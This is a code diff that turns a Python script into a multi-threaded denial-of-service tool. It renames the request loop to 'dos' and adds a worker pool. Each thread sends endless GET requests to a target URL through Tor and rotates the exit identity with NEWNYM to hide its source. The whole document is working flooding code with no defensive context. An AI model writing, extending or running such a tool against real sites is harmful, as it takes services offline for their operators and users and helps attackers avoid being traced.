@@ -1,3 +1,5 @@
+from threading import Thread
+
 import asyncio
 
 import aiohttp
@@ -22,13 +24,14 @@ PROXY_HOST = 'localhost'
 PROXY_PORT = 9050
 
 
-async def main(url: str, proxy_host: str = PROXY_HOST, proxy_port: str = PROXY_PORT):
+async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
     while True:
         # Proxy
         connector = ProxyConnector(
             proxy_type=ProxyType.SOCKS5,
             host=proxy_host,
             port=proxy_port,
+            # DNS resolution for Socket
             rdns=True
         )
 
@@ -41,7 +44,7 @@ async def main(url: str, proxy_host: str = PROXY_HOST, proxy_port: str = PROXY_P
         }
 
         async with session.get(url, headers=headers) as response:
-            print(f'Request to {re.sub(PROTOCOL_PATTERN, "", url)} made through {await response.text()} has a {response.status} status code')
+            print(f'#{worker + 1} Worker | Request to {re.sub(PROTOCOL_PATTERN, "", url)} made through {await response.text()} has a {response.status} status code')
 
         await session.close()
 
@@ -52,12 +55,21 @@ async def main(url: str, proxy_host: str = PROXY_HOST, proxy_port: str = PROXY_P
             controller.signal(Signal.NEWNYM)
 
 
-def runner(args: argparse.Namespace):
-    loop = asyncio.get_event_loop()
+def runner(args: argparse.Namespace, loop: asyncio.unix_events._UnixSelectorEventLoop, worker: int):
+    asyncio.set_event_loop(loop)
 
-    loop.create_task(main(args.url, args.proxy_host, args.proxy_port))
+    loop.create_task(dos(args.url, args.proxy_host, args.proxy_port, worker))
 
     loop.run_forever()
+
+
+def pool(args: argparse.Namespace):
+    for worker in range(args.workers):
+        loop = asyncio.new_event_loop()
+
+        thread = Thread(target=runner, args=(args, loop, worker))
+
+        thread.start()
 
 
 if __name__ == '__main__':
@@ -69,17 +81,25 @@ if __name__ == '__main__':
         default=URL,
         type=str
     )
+
     parser.add_argument(
         '--proxy_host',
         default=PROXY_HOST,
         type=str
     )
+
     parser.add_argument(
         '--proxy_port',
         default=PROXY_PORT,
         type=int
     )
 
+    parser.add_argument(
+        '--workers',
+        default=1,
+        type=int
+    )
+
     args = parser.parse_args()
-    
-    runner(args)
+
+    pool(args)
